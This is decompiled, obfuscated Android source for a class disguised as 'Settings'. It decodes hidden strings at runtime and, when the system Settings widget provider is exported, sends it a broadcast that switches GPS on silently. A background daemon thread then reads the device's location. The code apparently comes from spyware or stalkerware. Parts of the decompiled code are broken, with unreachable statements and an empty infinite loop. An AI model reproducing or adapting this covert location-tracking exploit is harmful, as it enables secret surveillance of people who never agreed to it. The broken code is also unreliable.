package o;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ComponentInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageItemInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Looper;
import android.provider.Settings.Secure;

public abstract class Settings
  extends Thread
{
  static final byte[] log = { 12, 76, -69, -65, -3, 12, 2, -19, 11, -6, 1, -3, 12, 2, -19, 11, -6, 1, 15, -17, -2, 3, -7, 13, 5, -1, -13, -1, 20, -2, -11, 0, -3, -8, 18, 1 };
  protected LocationListener mListener;
  protected LocationManager mLocationManager;
  protected String mProviderName = "gps";
  private Looper m_looper;
  
  public Settings()
  {
    setDaemon(true);
    mLocationManager = ((LocationManager)JSONArray.getContext().getSystemService(getString(log[10], log[31], log[25])));
  }
  
  public static boolean doInBackground()
  {
    Object localObject1 = JSONArray.getContext().getPackageManager();
    try
    {
      localObject1 = ((PackageManager)localObject1).getPackageInfo("com.android.settings", 2);
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException)
    {
      int j;
      int i;
      for (;;) {}
    }
    return false;
    if (localObject1 != null)
    {
      localObject1 = receivers;
      j = localObject1.length;
      i = 0;
      while (i < j)
      {
        Object localObject2 = localObject1[i];
        if ((name.equals("com.android.settings.widget.SettingsAppWidgetProvider")) && (exported)) {
          return true;
        }
        i += 1;
      }
    }
    return false;
  }
  
  public static void execute()
  {
    Object localObject = JSONArray.getString();
    int i = log[31];
    if (Settings.Secure.getString((ContentResolver)localObject, getString(i, i, -log[9])).contains("gps"))
    {
      localObject = new Intent();
      ((Intent)localObject).setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
      ((Intent)localObject).addCategory("android.intent.category.ALTERNATIVE");
      ((Intent)localObject).setData(Uri.parse("3"));
      JSONArray.getContext().sendBroadcast((Intent)localObject);
    }
  }
  
  static String getString(int paramInt1, int paramInt2, int paramInt3)
  {
    paramInt3 += 4;
    int m = 26 - paramInt1 * 18;
    paramInt2 = paramInt2 * 3 + 108;
    byte[] arrayOfByte1 = log;
    int i = 0;
    int k = 0;
    byte[] arrayOfByte2 = new byte[m];
    paramInt1 = paramInt2;
    int j = paramInt3;
    if (arrayOfByte1 == null) {
      i = paramInt3;
    }
    for (paramInt1 = k;; paramInt1 = j)
    {
      paramInt2 = i - paramInt2;
      j = paramInt3;
      i = paramInt1;
      paramInt1 = paramInt2;
      arrayOfByte2[i] = ((byte)paramInt1);
      paramInt3 = j + 1;
      j = i + 1;
      if (j == m) {
        return new String(arrayOfByte2, 0);
      }
      paramInt2 = arrayOfByte1[paramInt3];
      i = paramInt1;
    }
  }
  
  public final Location get()
  {
    return mLocationManager.getLastKnownLocation(mProviderName);
  }
  
  public abstract void init();
  
  public final boolean isEnabled()
  {
    return mLocationManager.isProviderEnabled("gps");
  }
  
  protected final void onCreate(LocationListener paramLocationListener)
  {
    mListener = paramLocationListener;
  }
  
  public void run()
  {
    Looper.prepare();
    init();
    m_looper = Looper.myLooper();
    Looper.loop();
  }
  
  public final void stop()
  {
    if ((mListener != null) && (mLocationManager != null)) {
      mLocationManager.removeUpdates(mListener);
    }
    mLocationManager = null;
    if (m_looper != null) {
      m_looper.quit();
    }
  }
}
